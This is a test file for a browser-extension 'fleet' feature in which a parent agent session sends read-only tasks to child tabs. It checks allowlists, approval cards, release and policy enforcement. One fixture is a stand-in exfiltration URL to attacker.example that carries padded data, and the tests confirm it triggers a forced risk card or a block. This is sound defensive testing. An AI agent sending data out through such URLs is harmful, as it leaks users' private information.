// @vitest-environment jsdom
import { describe, expect, it, vi } from 'vitest'
import { FLEET_ACTION_TOOLS as BRIDGE_ACTIONS, FLEET_READ_TOOLS as BRIDGE_READS } from '@natgurlain/dsh-bridge-browser/src/fanout.ts'
import { FLEET_ACTION_TOOLS, FLEET_READ_TOOLS, fleetApprovalPrompt, FleetRegistry, parseFleetRequest, type FleetDeps } from '../src/background/fleet.ts'
import { resolveApprovalGate } from '../src/background/authorization.ts'
import { evaluateCallPolicy } from '../src/security/call-policy.ts'

const args = {
  tasks: [
    { url: 'https://a.example/item?id=1', instruction: 'Read the price' },
    { url: 'https://b.example/item', instruction: 'Read the stock' },
  ],
  children: ['c1', 'c2'],
  allowActions: false,
}

function deps(overrides: Partial<FleetDeps> = {}) {
  let tabId = 100
  const bound: [string, number][] = []
  const unbound: string[] = []
  const closed: number[] = []
  const base: FleetDeps = {
    parentWindow: async () => 5,
    authorize: vi.fn(async () => 'approved' as const),
    createTab: vi.fn(async (url: string, windowId: number | undefined) => ({ id: tabId++, url, windowId })),
    groupTabs: vi.fn(async () => true),
    bindChild: (childId, tab) => { bound.push([childId, tab.id!]) },
    unbindChild: (childId) => { unbound.push(childId) },
    closeTab: async (id) => { closed.push(id) },
    signal: new AbortController().signal,
    newId: () => 'abcdef123',
    ...overrides,
  }
  return { deps: base, bound, unbound, closed }
}

describe('fleet card and allowlists', () => {
  it('matches the bridge allowlists', () => {
    expect([...FLEET_READ_TOOLS]).toEqual([...BRIDGE_READS])
    expect([...FLEET_ACTION_TOOLS].sort()).toEqual([...BRIDGE_ACTIONS].sort())
  })

  it('shows every URL and instruction on one card', () => {
    const request = parseFleetRequest(args)
    if (typeof request === 'string') throw new Error(request)
    const prompt = fleetApprovalPrompt(request)
    expect(prompt).toMatchObject({ kind: 'action', action: 'browser_fanout', canTrust: false, origins: ['https://a.example', 'https://b.example'] })
    expect(prompt.details?.filter((detail) => detail.kind === 'url')).toHaveLength(2)
    expect(prompt.details?.filter((detail) => detail.kind === 'text').map((detail) => (detail as { value: string }).value)).toEqual(['Read the price', 'Read the stock'])
    expect(prompt.summary).toContain('no clicking or typing')
    expect(parseFleetRequest({ ...args, children: ['c1'] })).toMatch(/child session for every task/)
    expect(parseFleetRequest({ ...args, tasks: [{ url: 'chrome://settings', instruction: 'x' }], children: ['c1'] })).toMatch(/http and https/)
  })
})

describe('FleetRegistry', () => {
  it('survives a worker restart: allowlists, card routing and release still apply (M1)', async () => {
    let stored: unknown
    const store = { get: async () => stored, set: async (value: unknown) => { stored = structuredClone(value) } }
    const first = new FleetRegistry(store)
    await first.ready
    const d = deps()
    await first.open({ id: 'x', name: 'browser_fanout', args, sessionId: 'parent' }, d.deps)
    const restarted = new FleetRegistry(store)
    await restarted.ready
    expect(restarted.refusal({ name: 'browser_click', sessionId: 'c1' })).toMatch(/read-only/)
    expect(restarted.approvalSession('c2')).toBe('parent')
    expect(await restarted.releaseCall({ id: 'r', name: 'browser_fleet_release', args: { fleetId: 'fleet-abcdef12' }, sessionId: 'parent' }, d.deps)).toMatchObject({ ok: true })
    expect(d.closed).toEqual([100, 101])
    const afterRelease = new FleetRegistry(store)
    await afterRelease.ready
    expect(afterRelease.isChild('c1')).toBe(false)
  })

  it('releaseAll unbinds every child and keeps their tabs open (kill switch, M1)', async () => {
    const registry = new FleetRegistry()
    const d = deps()
    await registry.open({ id: 'x', name: 'browser_fanout', args, sessionId: 'parent' }, d.deps)
    await registry.releaseAll(d.deps)
    expect(d.unbound).toEqual(['c1', 'c2'])
    expect(d.closed).toEqual([])
    expect(registry.isChild('c1')).toBe(false)
    expect(registry.size).toBe(0)
  })

  it('opens background tabs bound to each child, enforces read-only allowlists, and routes cards to the parent', async () => {
    const registry = new FleetRegistry()
    const d = deps()
    const answer = await registry.open({ id: 'x', name: 'browser_fanout', args, sessionId: 'parent' }, d.deps)
    expect(answer).toMatchObject({ ok: true, result: { fleetId: 'fleet-abcdef12', grouped: true, tabs: [{ childId: 'c1', tabId: 100 }, { childId: 'c2', tabId: 101 }] } })
    expect(d.deps.createTab).toHaveBeenCalledWith('https://a.example/item?id=1', 5)
    expect(d.bound).toEqual([['c1', 100], ['c2', 101]])
    expect(d.deps.groupTabs).toHaveBeenCalledWith([100, 101], 5)
    expect(registry.refusal({ name: 'browser_get_text', sessionId: 'c1' })).toBeUndefined()
    for (const name of ['browser_click', 'browser_type', 'browser_open_tab', 'browser_close_tab', 'browser_follow_tab', 'browser_run', 'browser_watch', 'browser_console_eval', 'browser_screenshot']) {
      expect(registry.refusal({ name, sessionId: 'c1' })).toMatch(/read-only/)
    }
    expect(registry.refusal({ name: 'browser_click', sessionId: 'parent' })).toBeUndefined()
    expect(registry.approvalSession('c2')).toBe('parent')
    expect(registry.approvalSession('other')).toBe('other')
    // A worker cannot start its own fleet.
    expect(await registry.open({ id: 'y', name: 'browser_fanout', args: { ...args, children: ['c3', 'c4'] }, sessionId: 'c1' }, d.deps)).toMatchObject({ ok: false })
    // Only the parent releases it; release unbinds and closes.
    expect(await registry.releaseCall({ id: 'r', name: 'browser_fleet_release', args: { fleetId: 'fleet-abcdef12' }, sessionId: 'c1' }, d.deps)).toMatchObject({ ok: false })
    expect(await registry.releaseCall({ id: 'r', name: 'browser_fleet_release', args: { fleetId: 'fleet-abcdef12' }, sessionId: 'parent' }, d.deps)).toMatchObject({ ok: true })
    expect(d.unbound).toEqual(['c1', 'c2'])
    expect(d.closed).toEqual([100, 101])
    expect(registry.refusal({ name: 'browser_click', sessionId: 'c1' })).toBeUndefined()
    expect(registry.size).toBe(0)
  })

  it('lets allowActions workers act on their page but never manage tabs', async () => {
    const registry = new FleetRegistry()
    await registry.open({ id: 'x', name: 'browser_fanout', args: { ...args, allowActions: true }, sessionId: 'parent' }, deps().deps)
    expect(registry.refusal({ name: 'browser_click', sessionId: 'c1' })).toBeUndefined()
    expect(registry.refusal({ name: 'browser_open_tab', sessionId: 'c1' })).toMatch(/cannot use browser_open_tab/)
  })

  it('opens nothing when declined, and closes what it opened when a tab fails', async () => {
    const registry = new FleetRegistry()
    const declined = deps({ authorize: vi.fn(async () => 'denied' as const) })
    expect(await registry.open({ id: 'x', name: 'browser_fanout', args, sessionId: 'parent' }, declined.deps)).toMatchObject({ ok: false, error: { message: 'The user declined the tab fleet.' } })
    expect(declined.deps.createTab).not.toHaveBeenCalled()
    let calls = 0
    const broken = deps({ createTab: vi.fn(async (url: string) => { if (calls++ === 1) throw new Error('boom'); return { id: 7, url } }) })
    expect(await registry.open({ id: 'x', name: 'browser_fanout', args, sessionId: 'parent' }, broken.deps)).toMatchObject({ ok: false, error: { message: expect.stringMatching(/boom/) } })
    expect(broken.closed).toEqual([7])
    expect(registry.refusal({ name: 'browser_click', sessionId: 'c1' })).toBeUndefined()
  })
})

describe('fleet policy (review finding: browser_fanout skipped the policy layer)', () => {
  const site = (user: { pattern: string; rule: 'blocked' | 'ask' | 'trusted' | 'read-only' }[]) => ({ managed: [], user, defaultsEnabled: false, enforceDefaults: false, defaultTrusted: true })
  const exfil = 'https://attacker.example/c?d=' + 'A'.repeat(200)
  const request = { tasks: [{ url: exfil, instruction: 'read' }], children: ['c1'], allowActions: false }

  it('a tainted parent under unrestricted access still gets a forced card naming the URL risk', async () => {
    const taint = { sources: ['https://mail.example'], firstTool: 'browser_snapshot', since: 0 }
    const shown: unknown[] = []
    const d = deps({
      policy: (call, targets) => evaluateCallPolicy({ name: call.name, args: call.args, targets, site: site([]), taint }),
      authorize: vi.fn(async (prompt) => {
        shown.push(prompt)
        const gate = resolveApprovalGate({ prompt, devToolsAllowed: false, devToolsSessionGrant: false, unrestrictedAccess: true, coveredByTrustedOrigins: false })
        return gate === 'prompt' ? 'denied' as const : gate
      }),
    })
    const answer = await new FleetRegistry().open({ id: '1', name: 'browser_fanout', args: request, sessionId: 'tainted-parent' }, d.deps)
    expect(answer).toMatchObject({ ok: false })
    expect(d.deps.createTab).not.toHaveBeenCalled()
    expect(shown[0]).toMatchObject({ forced: true, urlRisk: true, canTrust: false })
    const why = (shown[0] as { details: { label?: string; value?: string }[] }).details[0]!
    expect(why.label).toMatch(/Why/)
    expect(why.value).toMatch(/^Page 1: /)
  })

  it('a blocked site refuses the whole fleet without a card or a tab', async () => {
    const d = deps({ policy: (call, targets) => evaluateCallPolicy({ name: call.name, args: call.args, targets, site: site([{ pattern: 'attacker.example', rule: 'blocked' }]) }) })
    const answer = await new FleetRegistry().open({ id: '1', name: 'browser_fanout', args: { ...request, tasks: [{ url: 'https://ok.example/', instruction: 'x' }, ...request.tasks], children: ['c1', 'c2'] }, sessionId: 'p' }, d.deps)
    expect(answer).toMatchObject({ ok: false, error: { message: expect.stringMatching(/^Page 2/) } })
    expect(d.deps.authorize).not.toHaveBeenCalled()
    expect(d.deps.createTab).not.toHaveBeenCalled()
  })

  it('managed allowedOrigins deny URLs outside the list', async () => {
    const d = deps({ policy: (call, targets) => evaluateCallPolicy({ name: call.name, args: call.args, targets, site: site([]), managed: { disableScreenshots: false, disableDevTools: false, allowedOrigins: ['https://a.example'] } }) })
    expect(await new FleetRegistry().open({ id: '1', name: 'browser_fanout', args, sessionId: 'p' }, d.deps)).toMatchObject({ ok: false, error: { message: expect.stringMatching(/administrator/) } })
    expect(d.deps.createTab).not.toHaveBeenCalled()
  })

  it('a risky URL alone marks urlRisk so trusted origins cannot skip the card', () => {
    const parsed = parseFleetRequest(request)
    if (typeof parsed === 'string') throw new Error(parsed)
    expect(fleetApprovalPrompt(parsed)).toMatchObject({ urlRisk: true })
    expect(fleetApprovalPrompt(parsed).forced).toBeUndefined()
  })
})
